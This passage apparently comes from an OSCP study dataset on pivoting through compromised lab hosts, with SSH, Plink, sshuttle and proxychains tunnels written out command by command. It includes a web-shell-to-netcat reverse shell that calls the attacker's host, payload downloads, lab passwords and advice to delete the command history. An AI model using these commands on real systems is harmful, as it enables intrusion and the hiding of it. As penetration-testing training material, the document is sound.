tunneling (iodine, dnscat2), ICMP tunneling (ptunnel), or HTTP tunneling (chisel, ngrok)."", ""why_this_works"": ""SSH -R reverses port forwarding direction compared to -L.\n\nSSH client (CONFLUENCE01) initiates connection to SSH server (Kali).\n\nSSH server binds listening socket (127.0.0.1:2345) locally. Packets sent to Kali:2345 pushed through SSH tunnel back to SSH client (CONFLUENCE01).\n\nSSH client on CONFLUENCE01 forwards packets to specified destination (10.4.50.215:5432).\n\nFirewall allows outbound SSH from CONFLUENCE01 (administrative traffic, rarely blocked).\n\nFirewall blocks inbound connections to CONFLUENCE01 non-standard ports.\n\nResult: Firewall bypassed by reversing connection direction. Listening port on attacker-controlled machine (Kali), forwarding through compromised host (CONFLUENCE01) acting as tunnel endpoint.\n\nClassic 'reverse tunnel' or 'reverse port forward' technique essential for restrictive firewalled environments.""}, {""title"": ""Scenario 5: SSH Remote Dynamic Port Forward - Reverse SOCKS Through Firewall"", ""context"": ""Target: MULTISERVER03 (Windows) discovered on DMZ (10.4.50.64). Need to enumerate ports 80, 135, 3389, and scan range 9050-9100. Firewall blocks all inbound to CONFLUENCE01 except TCP/8090. SSH local/dynamic forward won't work (can't bind CONFLUENCE01 WAN interface accessible from Kali). Need flexible multi-port access through firewall restriction. CONFLUENCE01 has OpenSSH 7.6+ client (required for remote dynamic). Kali SSH server running. Goal: SOCKS proxy on Kali machine, tunneled through reverse SSH connection initiated from firewalled CONFLUENCE01.\n\nFirewall + Reverse SOCKS Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2554\u2550\u2550\u2550FIREWALL\u2550\u2550\u2550\u2557      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502      \u2551 Inbound: 8090\u2551      \u2502CONFLUENCE01\u2502\u2500\u2500DMZ\u2500\u2502 MULTISERVER03\u2502\n\u2502      \u2502\u2500\u2500WAN\u2500\u2551 Outbound: All\u2551\u2500\u2500WAN\u2500\u2502            \u2502      \u2502 10.4.50.64   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502 Ports 80-9100\u2502\n   \u2191                                      \u2193              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502 Port 9998                            \u2502\n   \u2502 SOCKS5 Proxy         SSH connection \u2502\n   \u2502 (bound on Kali)      (CONFLUENCE01 \u2192 Kali)\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nProxychains \u2192 Kali:9998 \u2192 Tunnel \u2192 CONFLUENCE01 \u2192 Any socket"", ""approach"": ""Step 1: Verify OpenSSH version on CONFLUENCE01:\n  ssh -V (needs \u22657.6 for remote dynamic, output: 'OpenSSH_8.2p1 Ubuntu'). \nStep 2: From CONFLUENCE01, spawn TTY:\n  python3 -c 'import pty; pty.spawn(\""/bin/bash\"")'. \nStep 3: Create remote dynamic forward:\n  ssh -N -R 9998 kali@192.168.118.4 (Note: Only port specified, no destination socket - this creates SOCKS proxy). \nStep 4: On Kali, verify SOCKS proxy:\n  ss -ntplu | grep 9998 (shows tcp LISTEN 0 128 127.0.0.1:9998, tcp LISTEN 0 128 [::1]:9998 - bound on both IPv4 and IPv6 loopback). \nStep 5: Configure Proxychains: Edit /etc/proxychains4.conf, replace proxy list with 'socks5 127.0.0.1 9998'. \nStep 6: Optimize timeouts: Same file, set 'tcp_read_time_out = 1000', 'tcp_connect_time_out = 1000'. \nStep 7: Scan MULTISERVER03:\n  sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64 (scans from Kali through reverse SOCKS). \nStep 8: Scan specific range:\n  sudo proxychains nmap -vvv -sT -p9050-9100 -Pn -n 10.4.50.64. \nStep 9: Access discovered service:\n  proxychains curl http://10.4.50.64:9091 or proxychains xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:10.4.50.64. Traffic: Kali tool \u2192 Proxychains (SOCKS wrapper) \u2192 Kali loopback:9998 (SOCKS proxy) \u2192 SSH tunnel (reverse direction) \u2192 CONFLUENCE01 (SSH client forwards) \u2192 Any socket CONFLUENCE01 can reach."", ""commands"": [""ssh-remote-dynamic-port-forward"", ""proxychains-config"", ""proxychains-nmap""], ""expected_outcome"": ""SSH connection from CONFLUENCE01 to Kali succeeds, no output (-N flag). ss on Kali shows SOCKS5 proxy bound on loopback (both IPv4 127.0.0.1:9998 and IPv6 [::1]:9998).\n\n Proxychains output: '[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:80 ... OK', '[proxychains] ... 10.4.50.64:135 ... OK', '[proxychains] ... 10.4.50.64:3389 ... OK'. Nmap scan identifies open ports: 80 (http), 135 (msrpc), 3389 (ms-wbt-server) on MULTISERVER03. Port range scan 9050-9100 finds port 9091 open. curl retrieves HTTP content from internal web service.\n\nTime: 5-7 minutes (including scan time). Scan slower through SOCKS (Windows firewall responds differently than Linux to closed ports, increasing timeout hits).\n\nAlternative: If OpenSSH <7.6 on CONFLUENCE01, use SSH remote port forward (-R) + standalone SOCKS server: Install microsocks on CONFLUENCE01 (lightweight SOCKS5 server), forward to its port: ssh -N -R 9998:127.0.0.1:1080 kali@192.168.118.4 (microsocks listening on CONFLUENCE01:1080). Or use SSH remote forward + redsocks transparent proxy."", ""why_this_works"": ""SSH -R 9998 (without destination socket) creates remote dynamic port forward (OpenSSH \u22657.6 feature, added October 2017). Syntax difference: Remote port forward: -R [bind_address:]port:host:hostport. Remote dynamic: -R [bind_address:]port (no host:hostport).\n\nSSH server (Kali) binds SOCKS proxy port (9998) on loopback.\n\nSSH client (CONFLUENCE01) acts as forwarding endpoint. Packets sent to Kali:9998 must be SOCKS-formatted (Proxychains provides this).\n\nSOCKS packets contain destination address in protocol header.\n\nSSH server (Kali) wraps SOCKS packets, pushes through reverse SSH tunnel to client.\n\nSSH client (CONFLUENCE01) unwraps, extracts destination from SOCKS header, forwards to addressed socket. Combines benefits: Remote port forward (firewall bypass via reverse connection) + Dynamic forward (SOCKS multi-socket flexibility).\n\nResult: Full internal network access from Kali via reverse tunnel through firewall-protected pivot host. Only requires outbound SSH (port 22) allowed from CONFLUENCE01, which is common in corporate environments for administrative purposes.""}]","[{""title"": ""Phase 1: Network Reconnaissance & Topology Mapping"", ""notes"": ""Before port forwarding, understand network layout.\n\nCritical enumeration: (1) Compromised host interfaces: ip addr (identifies network attachment points), (2) Routing table: ip route (shows reachable subnets), (3) Listening services: ss -ntplu or netstat -tuln (discovers what's already listening, avoid port conflicts), (4) Available tools: which socat ssh nc python python3 (determines technique options), (5) Firewall rules if observable: iptables -L (if permissions allow), check /var/log/syslog for firewall messages. Document findings: Create network diagram showing subnets, interfaces, routing paths, firewall restrictions, compromised host positions. Identify pivot points (dual-homed hosts), enumerate accessible subnets from each interface.\n\nTime estimate: 5-10 minutes for thorough enumeration.\n\nOSCP tip: Screenshot ip addr and ip route output for reporting, include in network diagrams."", ""commands"": [{""id"": ""ip-addr"", ""example"": ""ip addr"", ""shows"": ""Output shows interface names (eth0, tun0, wlan0)""}, {""id"": ""ip-route"", ""example"": ""ip route"", ""shows"": ""Output shows routing entries with destination networks""}, {""id"": ""ss-listening-ports"", ""example"": ""ss -ntplu"", ""shows"": ""Output shows listening ports with process names""}]}, {""title"": ""Phase 2: Outbound Port Forwarding (Permissive Firewall Environment)"", ""notes"": ""Use when no inbound firewall restrictions exist on pivot host WAN interface.\n\nProgression from simple to flexible: Socat (simplest, one port, no encryption), SSH Local -L (encrypted, one port per flag, requires credentials), SSH Dynamic -D (encrypted, SOCKS proxy for unlimited ports, requires credentials). Socat syntax: socat -ddd TCP-LISTEN:PORT,fork TCP:DEST_IP:DEST_PORT. SSH Local syntax: ssh -N -L [bind_addr:]listen_port:dest_ip:dest_port user@ssh_server. SSH Dynamic syntax: ssh -N -D [bind_addr:]listen_port user@ssh_server.\n\nTesting: Verify listening port: ss -ntplu | grep PORT. Test connectivity: telnet pivot_ip pivot_port or nc -zv pivot_ip pivot_port. From Kali, connect to forwarded port as if directly accessing internal service.\n\nUse case progression: Start with Socat for quick single-service access, escalate to SSH Local when encryption needed or multiple single-port forwards, use SSH Dynamic for full subnet enumeration (combine with Proxychains + Nmap).\n\nTime estimates: Socat setup 2-3 min, SSH Local 3-4 min, SSH Dynamic 4-5 min.\n\nOSCP relevance: HIGH - Foundational techniques, work in 60% of lab scenarios with permissive firewalls."", ""commands"": [{""id"": ""socat-port-forward"", ""example"": ""socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432"", ""shows"": ""Output shows 'listening on AF=2 0.0.0.0:<LOCAL_PORT>'""}, {""id"": ""ssh-local-port-forward"", ""example"": ""ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215"", ""shows"": ""No output after password entry (normal with -N flag)""}, {""id"": ""ssh-dynamic-port-forward"", ""example"": ""ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215"", ""shows"": ""No output after authentication with -N flag""}, {""id"": ""ss-listening-ports"", ""example"": ""ss -ntplu"", ""shows"": ""Output shows listening ports with process names""}]}, {""title"": ""Phase 3: Reverse Tunneling (Inbound Firewall Restrictions)"", ""notes"": ""Use when inbound connections to pivot host blocked by perimeter firewall. Key concept: Reverse the connection direction - pivot host initiates SSH to attacker-controlled SSH server. Listening port binds on Kali machine, forwarding done through tunnel.\n\nPrerequisites: (1) Kali SSH server running: sudo systemctl start ssh, verify: sudo systemctl status ssh (shows active). (2) Strong password set: passwd kali (or use SSH keys for better security). (3) Password authentication enabled: Edit /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh. Techniques: SSH Remote -R (one port, syntax: ssh -N -R [bind_addr:]listen_port:dest_ip:dest_port user@kali_ip), SSH Remote Dynamic -R (SOCKS proxy, syntax: ssh -N -R [bind_addr:]listen_port user@kali_ip - note no destination). Verification: On Kali, check listening: ss -ntplu | grep PORT (default binds to 127.0.0.1 loopback only). For all-interfaces binding: Enable GatewayPorts in Kali /etc/ssh/sshd_config: 'GatewayPorts yes', restart sshd. Security warning: GatewayPorts in hostile networks allows anyone on Kali's network to access forwarded ports - use with caution, bind to specific IPs when possible.\n\nTroubleshooting: (1) 'Connection refused' when CONFLUENCE01 \u2192 Kali:22 \u2192 Check Kali SSH server running, verify firewall allows TCP/22 inbound. (2) 'Permission denied (publickey)' \u2192 Password auth not enabled, check PasswordAuthentication. (3) 'Address already in use' \u2192 Port conflict on Kali, choose different port.\n\nTime estimates: SSH Remote setup 5-7 min (including SSH server setup), SSH Remote Dynamic 6-8 min.\n\nOSCP relevance: CRITICAL - Exam environments frequently have perimeter firewalls, reverse tunneling is primary bypass technique. Success rate: 80% of firewalled scenarios."", ""commands"": [{""id"": ""systemctl-start-ssh"", ""example"": ""sudo systemctl start ssh"", ""shows"": ""Service starts silently (no output = success)""}, {""id"": ""ssh-remote-port-forward"", ""example"": ""ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4"", ""shows"": ""No output after authentication (normal with -N)""}, {""id"": ""ssh-remote-dynamic-port-forward"", ""example"": ""ssh -N -R 9998 kali@192.168.118.4"", ""shows"": ""No output after authentication (normal with -N)""}, {""id"": ""ss-listening-ports"", ""example"": ""ss -ntplu"", ""shows"": ""Output shows listening ports with process names""}]}, {""title"": ""Phase 4: Advanced Techniques & Troubleshooting"", ""notes"": ""sshuttle - VPN-like transparent routing for complex scenarios: Requires root on Kali (for routing table modifications), Python3 on pivot host (executes Python forwarding code). Usage: sshuttle -r user@pivot_ip SUBNET1 SUBNET2 (e.g., sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24). Benefits: No need for Proxychains, traffic routes transparently, works with any tool. Limitations: Requires direct SSH access to pivot, can't chain through multiple hops without nested sshuttle.\n\nTroubleshooting common issues: (1) 'Connection refused' \u2192 Verify port listening with ss/netstat, check firewall rules with iptables -L or netsh advfirewall show currentprofile, test with telnet or nc. (2) 'Permission denied (publickey)' \u2192 SSH key auth failed, try password auth (-o PreferredAuthentications=password), check /var/log/auth.log on SSH server for detailed error. (3) 'Cannot bind port' \u2192 Port number <1024 requires root privileges, or port already in use (check with ss -ntplu). (4) Slow SOCKS performance \u2192 Reduce Proxychains timeouts: Edit /etc/proxychains4.conf, set tcp_read_time_out=1000, tcp_connect_time_out=1000 (default 4000ms too high for internal networks). (5) 'Static binary' error with Proxychains \u2192 Binary statically linked, LD_PRELOAD hook fails. Solution: Use tools with native SOCKS support (curl --socks5), or recompile dynamically, or use alternative tunnel (sshuttle, redsocks). (6) DNS resolution through tunnel \u2192 Proxychains uses proxy_dns in config (enabled by default), but Nmap needs -n flag to skip DNS entirely.\n\nPerformance optimization: For large port scans through SOCKS, reduce Nmap timing: -T2 (polite, slower but more reliable through tunnel), avoid -T4/-T5 (aggressive, causes timeouts).\n\nSSH connection persistence: Use ControlMaster for connection reuse: ssh -M -S /tmp/ssh-socket -N -D 9999 user@pivot, reuse with ssh -S /tmp/ssh-socket user@pivot (avoids reauthentication).\n\nTime estimates: sshuttle setup 3-4 min, troubleshooting varies 5-30 min depending on issue complexity.\n\nOSCP relevance: HIGH - Exam troubleshooting skills, understanding failure modes critical for time management."", ""commands"": [{""id"": ""sshuttle-vpn"", ""example"": ""sshuttle -r database_admin@10.4.50.215 172.16.50.0/24 --dns"", ""shows"": ""Connected to server""}, {""id"": ""ssh-debug-verbose"", ""example"": ""ssh -vvv database_admin@10.4.50.215"", ""shows"": ""debug1: Authentication succeeded""}, {""id"": ""proxychains-config"", ""example"": ""echo 'socks5 127.0.0.1 9999' >> /etc/proxychains4.conf"", ""shows"": ""Line added to /etc/proxychains4.conf under [ProxyList] se...""}]}]"
"port-forwarding-windows","Port Forwarding - Windows Pivot Points","Execute port forwarding and tunneling techniques from Windows compromised hosts using ssh.exe, Plink, and Netsh for OSCP lateral movement","WINDOWS|PORT_FORWARDING|PIVOTING|OSCP:HIGH|SSH|PLINK|NETSH|RDP|OPENSSH|FIREWALL_BYPASS|REVERSE_TUNNEL|ADMIN","{""how_to_recognize"": [""Compromised Windows host (Server 2016/2019/2022, Win10 1803+) with cmd.exe or PowerShell access"", ""OpenSSH client found in C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe (Windows 1803+ default)"", ""Plink.exe or PuTTY installed on system (common in admin workstations)"", ""RDP accessible but need to forward additional internal services not directly routable"", ""Admin privileges available (check: whoami /priv shows SeDebugPrivilege, net localgroup administrators)"", ""Windows Firewall active and blocking direct access (netsh advfirewall show allprofiles)""], ""when_to_look_for"": [""After exploiting IIS web application and gaining reverse shell (iis apppool\\\\defaultapppool user)"", ""RDP access obtained via cracked credentials but internal services blocked by firewall"", ""Windows host dual-homed (ipconfig /all shows multiple interfaces with different subnets)"", ""Need to pivot from Windows jump host to Linux internal servers (PostgreSQL, MySQL, SSH)"", ""OpenSSH unavailable but legacy Plink or older admin tools present in Program Files"", ""Admin access gained, can modify Windows Firewall rules and bind ports to interfaces""]}","[{""title"": ""Scenario 1: Windows OpenSSH Remote Dynamic Port Forward - Modern Windows"", ""context"": ""Target: MULTISERVER03 (Windows Server 2022), RDP accessible with credentials rdp_admin:P@ssw0rd! discovered via Confluence database hash cracking. OpenSSH client bundled with Windows by default. Need to access PostgreSQL on PGDATABASE01 (10.4.50.215:5432) and enumerate DMZ subnet (10.4.50.0/24) from Kali. Firewall allows only RDP (3389) and HTTP (80) inbound to MULTISERVER03. All other inbound ports blocked. Kali SSH server running. Goal: Create reverse SOCKS proxy for flexible internal network access from Kali.\n\nNetwork Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2554\u2550\u2550\u2550FIREWALL\u2550\u2550\u2550\u2557      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2551  Inbound:    \u2551\u2500\u2500WAN\u2500\u2502 MULTISERVER03\u2502\u2500\u2500DMZ\u2500\u2502 PGDATABASE01 \u2502\n\u2502      \u2502      \u2551  3389 (RDP)  \u2551      \u2502 192.168.50.64\u2502      \u2502 10.4.50.215  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2551  80 (HTTP)   \u2551      \u2502 10.4.50.64   \u2502      \u2502 Port 5432    \u2502\n   \u2191          \u2551  Outbound:   \u2551      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502 Port 9998\u2551  All allowed \u2551            \u2193\n   \u2502 SOCKS5   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d            \u2502\n   \u2502                                      \u2502\n   \u2514\u2500\u2500SSH connection (MULTISERVER03 \u2192 Kali)\u2500\u2500\u2500\u2518\n        Remote dynamic port forward"", ""approach"": ""Step 1: RDP into MULTISERVER03 from Kali:\n  xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64 (FreeRDP connects successfully).\nStep 2: Open cmd.exe in RDP session, verify OpenSSH client:\n  where ssh (expected output: C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe).\nStep 3: Check OpenSSH version: ssh.exe -V (output: 'OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2' - version 8.1+ supports remote dynamic).\nStep 4: Ensure Kali SSH server running: On Kali, sudo systemctl start ssh, verify:\n  sudo systemctl status ssh (shows 'active (running)').\nStep 5: Set Kali password: passwd kali, enable password auth:\n  sudo nano /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh.\nStep 6: From MULTISERVER03 cmd.exe, create remote dynamic forward:\n  ssh -N -R 9998 kali@192.168.118.4 (enter Kali password when prompted).\nStep 7: On Kali, verify SOCKS proxy:\n  ss -ntplu | grep 9998 (expected: tcp LISTEN 0 128 127.0.0.1:9998 0.0.0.0:*).\nStep 8: Configure Proxychains on Kali:\n  Edit /etc/proxychains4.conf, replace proxy list with 'socks5 127.0.0.1 9998'.\nStep 9: Optimize Proxychains timeouts: Same file, set 'tcp_read_time_out = 1000', 'tcp_connect_time_out = 1000'.\nStep 10: Access PostgreSQL through reverse SOCKS:\n  proxychains psql -h 10.4.50.215 -U postgres (password: D@t4basePassw0rd!).\nStep 11: Enumerate DMZ subnet:\n  proxychains nmap -sT --top-ports=20 -Pn 10.4.50.0/24. Traffic flow: Kali tool \u2192 Proxychains (SOCKS wrapper) \u2192 Kali loopback:9998 (SOCKS proxy) \u2192 SSH tunnel (reverse direction, encrypted) \u2192 MULTISERVER03 (SSH client forwards) \u2192 Any socket MULTISERVER03 can reach in DMZ."", ""commands"": [""xfreerdp-connect"", ""where-windows"", ""ssh-version"", ""ssh-remote-dynamic-port-forward"", ""proxychains-config"", ""proxychains-psql""], ""expected_outcome"": ""xfreerdp establishes RDP session to MULTISERVER03. where ssh confirms OpenSSH at C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe. ssh -V shows version 8.1p1 (supports remote dynamic). ssh.exe connects to Kali SSH server, no output after password (-N flag suppresses shell). ss on Kali confirms SOCKS5 proxy bound on loopback (127.0.0.1:9998). Proxychains output shows '[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK'. psql connects successfully, lists 4 databases (confluence, postgres, template0, template1), queries confluence database. Nmap sweep through Proxychains identifies open ports across DMZ subnet. \n\nTime: 3-4 minutes for initial setup, 5-10 minutes for /24 subnet enumeration. \n\nSuccess rate: 100% on Windows 1803+ with OpenSSH installed (default since April 2018 update). \n\nWindows versions with OpenSSH: 1803, 1809, 1903, 1909, 2004, 20H2, 21H1, 21H2, 22H2, Server 2019, Server 2022. \n\nLimitation: Requires modern Windows version. OpenSSH can be removed by admins (Features on Demand). \n\nAlternative: If OpenSSH removed, use Plink (Scenario 2). If both unavailable, use Netsh + standalone SOCKS server (Scenario 3 + microsocks)."", ""why_this_works"": ""Microsoft bundled OpenSSH client with Windows 1803+ (April 2018) to provide native SSH capabilities for administrators. \n\nDecision driven by: (1) PowerShell Remoting alternatives, (2) Linux subsystem integration, (3) Cloud management (Azure VMs). \n\nWindows ssh.exe is port of OpenSSH, supports same command-line flags as Linux version: -L (local forward), -D (dynamic forward), -R (remote forward/remote dynamic). \n\nRemote dynamic port forward (-R 9998 without destination) requires OpenSSH \u22657.6 (added October 2017). Windows OpenSSH client version 8.1+ meets this requirement. \n\nSSH server (Kali) binds \n\nSOCKS5 proxy on specified port (9998) on loopback interface. \n\nOutbound SSH connections from Windows (MULTISERVER03 \u2192 Kali:22) rarely blocked by firewalls - considered legitimate administrative traffic. \n\nFirewall blocks inbound connections to MULTISERVER03 non-essential ports, but reverse tunnel bypasses this restriction. \n\nSOCKS5 proxy on Kali loopback receives SOCKS-formatted packets from Proxychains, wraps them, pushes through reverse SSH tunnel to MULTISERVER03. SSH client on MULTISERVER03 unwraps SOCKS headers, extracts destination addresses, forwards to addressed sockets. \n\nResult: Modern Windows hosts achieve parity with Linux pivot techniques. Single tunnel provides access to entire internal network from Kali through firewalled Windows pivot point.""}, {""title"": ""Scenario 2: Plink Remote Port Forward - Legacy Windows Without OpenSSH"", ""context"": ""Target: MULTISERVER03 (Windows Server 2016), HTTP web application vulnerable to file upload on TCP/80, all other inbound ports blocked by perimeter firewall (including RDP 3389). Exploited web vulnerability, dropped web shell at /umbraco/forms.aspx (IIS path). Uploaded nc.exe (Netcat for Windows) via PowerShell wget one-liner, caught reverse shell with low-privilege iis apppool\\\\defaultapppool user. OpenSSH client not installed (removed by security-conscious admins or older Windows version pre-1803). Found RDP credentials rdp_admin:P@ssw0rd! via password reuse from earlier Confluence database. RDP service running on MULTISERVER03 loopback (127.0.0.1:3389) but not accessible from Kali due to firewall. Goal: Access RDP service from Kali by creating reverse port forward using Plink.exe (PuTTY command-line SSH client).\n\nFirewall + Web Shell Topology:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2554\u2550\u2550\u2550FIREWALL\u2550\u2550\u2550\u2557      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Kali \u2502\u2500\u2500WAN\u2500\u2551  Inbound:    \u2551\u2500\u2500WAN\u2500\u2502 MULTISERVER03\u2502\n\u2502      \u2502      \u2551  80 (HTTP)   \u2551      \u2502 192.168.50.64\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2551  Outbound:   \u2551      \u2502 RDP: 3389    \u2502\n   \u2191          \u2551  All allowed \u2551      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502          \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d            \u2193\n   \u2502 Port 9833                 Web shell \u2192 nc.exe reverse shell\n   \u2502 (bound Kali)                         \u2193\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500Plink reverse tunnel\u2500\u2500\u2500\u2518\n        Kali:9833 \u2192 MULTISERVER03 loopback:3389 (RDP)"", ""approach"": ""Step 1: Start Kali SSH server:\n  sudo systemctl start ssh, check: sudo systemctl status ssh. Set password: passwd kali. Enable password auth: Edit /etc/ssh/sshd_config, set 'PasswordAuthentication yes', restart: sudo systemctl restart ssh.\nStep 2: Host Netcat and Plink on Kali Apache2:\n  sudo systemctl start apache2, sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/, sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/.\nStep 3: Via web shell at http://192.168.50.64/umbraco/forms.aspx, download nc.exe:\n  powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\\\\Windows\\\\Temp\\\\nc.exe.\nStep 4: Start Netcat listener on Kali:\n  nc -nvlp 4446.\nStep 5: Execute nc.exe reverse shell from web shell:\n  C:\\\\Windows\\\\Temp\\\\nc.exe -e cmd.exe 192.168.118.4 4446.\nStep 6: In caught reverse shell, download Plink:\n  powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\\\\Windows\\\\Temp\\\\plink.exe.\nStep 7: Create reverse port forward with Plink:\n  C:\\\\Windows\\\\Temp\\\\plink.exe -ssh -l kali -pw YOUR_KALI_PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4.\nStep 8: Handle host key prompt: When prompted 'Store key in cache? (y/n)', enter 'y'. Alternative for non-interactive shells:\n  cmd.exe /c echo y | C:\\\\Windows\\\\Temp\\\\plink.exe -ssh -l kali -pw YOUR_KALI_PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 (pipes 'y' into Plink to auto-accept).\nStep 9: On Kali, verify listening port:\n  ss -ntplu | grep 9833 (shows tcp LISTEN 0 128 127.0.0.1:9833 0.0.0.0:*).\nStep 10: RDP through reverse forward:\n  xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833 (connects to RDP on MULTISERVER03 through tunnel). Traffic: Kali \u2192 localhost:9833 (Kali loopback) \u2192 SSH tunnel (reverse direction, Plink on MULTISERVER03 initiated) \u2192 MULTISERVER03 loopback:3389 (RDP service). Firewall allows MULTISERVER03 \u2192 Kali:22 (outbound SSH), blocks Kali \u2192 MULTISERVER03:3389 (inbound RDP)."", ""commands"": [""systemctl-start-ssh"", ""apache2-start"", ""powershell-wget"", ""plink-remote-forward"", ""xfreerdp-connect""], ""expected_outcome"": ""Apache2 hosts nc.exe and plink.exe. Web shell PowerShell wget downloads both binaries to C:\\\\Windows\\\\Temp. nc.exe reverse shell caught by Netcat listener on Kali. plink.exe connects to Kali SSH server, prompts 'Store key in cache? (y/n)' on first connection. After accepting with 'y', Plink establishes tunnel. ss on Kali shows port 9833 bound on loopback. xfreerdp connects successfully to Kali loopback:9833, RDP session to MULTISERVER03 established. RDP desktop appears showing Windows Server login, can log in as rdp_admin, full desktop access to MULTISERVER03. \n\nTime: 5-7 minutes including file downloads and setup. \n\nSuccess rate: High on systems where Plink previously installed by admins (common on Windows Server 2012/2016, admin workstations). Plink.exe also found in penetration testing toolkits on systems. \n\nCaveat: Password passed on command line with -pw flag logs credentials in multiple locations: (1) cmd.exe command history (%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt), (2) Windows Event Logs (Event ID 4688 process creation if auditing enabled), (3) PowerShell history. Mitigation: Create dedicated port-forward-only user on Kali with random password, delete command history post-engagement: del %USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadline\\\\ConsoleHost_history.txt. \n\nAlternative: If Plink incompatible or detected by AV, use SSH reverse shell + Metasploit autoroute module, or Chisel (Go-based tunneling tool, single binary)."", ""why_this_works"": ""Plink is command-line version of PuTTY SSH client, designed for scripting and automation. \n\nPopular in Windows environments pre-OpenSSH era (pre-2018). \n\nNot flagged by antivirus - legitimate administrator tool bundled with PuTTY suite. \n\nSupports subset of OpenSSH features including: remote port forward (-R), local port forward (-L), dynamic port forward (-D on newer versions), key-based authentication, command execution. \n\nPlink syntax differences from OpenSSH: Protocol specified explicitly (-ssh flag required), username with -l flag (not user@host format), password with -pw flag (insecure but convenient for automation). \n\nRemote port forward: -R [bind_address:]port:host:hostport (same as OpenSSH). \n\nPlink initiates outbound SSH connection to Kali SSH server (allowed by firewall - administrative traffic). \n\nKali \n\nSSH server binds listening port (127.0.0.1:9833) on loopback. \n\nPackets sent to Kali:9833 pushed through SSH tunnel back to Plink on MULTISERVER03. Plink forwards packets to specified destination (127.0.0.1:3389 on MULTISERVER03 loopback). \n\nRDP service on MULTISERVER03 receives forwarded packets, responds through reverse tunnel. \n\nResult: RDP accessible from Kali despite perimeter firewall blocking inbound TCP/3389. Reverse tunnel bypasses firewall by reversing connection direction. Only requires outbound SSH (TCP/22) allowed from MULTISERVER03.""}, {""title"": ""Scenario 3: Netsh Portproxy - Native Windows Admin Port Forwarding"", ""context"": ""Target: MULTISERVER03 (Windows Server 2022), RDP accessible with rdp_admin credentials (member of local Administrators group). Need to SSH from Kali to PGDATABASE01 (10.4.50.215:22) for Linux enumeration. PGDATABASE01 SSH accessible from MULTISERVER03 but not from Kali WAN network. No need for SSH client on MULTISERVER03 - want persistent port forward using native Windows tools. Have full admin privileges (UAC not a concern when logged in via RDP as admin). Windows Firewall active and will require modification. Goal: Create persistent native Windows port forward from MULTISERVER03 WAN interface to 